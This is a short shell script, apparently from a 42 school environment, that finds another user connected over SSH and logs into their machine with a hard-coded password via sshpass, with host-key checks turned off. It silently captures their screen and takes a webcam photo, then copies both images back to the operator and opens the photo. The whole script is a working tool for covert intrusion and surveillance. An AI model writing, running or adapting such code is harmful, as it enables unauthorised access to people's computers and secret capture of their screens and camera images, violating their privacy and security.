echo "\033[0;31mSSH ON !\033[0;33m"
user=$(who | grep -v $USER | cut -d' ' -f1)
pass="password"
ip=$(netstat | grep ssh | cut -d' ' -f23 | cut -d'.' -f1)
cli=$(hostname | cut -d '.' -f1)
who | grep -v $USER | cut -d' ' -f1
echo "\033[0mGet pics ? (y/n)"
a="y"
if [ "$a" ==  "y" ]; then
	echo "Take pics.."
	~/42/scripts/sshpass -p $pass ssh $user@$ip -oStrictHostKeyChecking=no -oCheckHostIP=no "screencapture -x /goinfre/pic.png ; imagesnap /goinfre/cam.png"
	echo "Get pics.."
	~/42/scripts/sshpass -p $pass scp $user@$ip:/goinfre/*.png ~/
   open ~/cam.png &
   sleep 60
	echo "Done"
    exit -1
else
	echo "Cancelled.."
	exit 0
fi
